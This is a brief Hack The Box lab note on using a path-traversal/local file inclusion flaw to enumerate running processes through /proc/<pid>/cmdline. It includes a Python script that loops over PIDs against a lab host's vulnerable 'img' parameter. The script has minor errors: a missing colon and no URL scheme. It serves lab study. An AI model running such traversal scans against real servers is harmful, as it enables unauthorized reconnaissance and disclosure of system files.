### 20-03-23
### Hack The Box - path-traversal - enumuration over /proc/(number)/cmdline

/proc/(number)/cmdline - this path can be very helpful when you haven’t yet got terminal access to a box, it may be possible to see processes that are running on the box with local file inclusion if the vulnerability exists on the box. 
  
### proc_cmdline.py
  
```python
import requests

host = "test.htb/"
path = host + "vurn.php?img=../../../../../../../../../"

headers = {
    'Host': host,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
}

i=1
while i < 10000
    response = requests.get(path + 'proc/'+str(i)+'/cmdline',headers=headers,verify=False,)
    if response.text:
        print (str(i),response.text)
    i = i + 1  
```
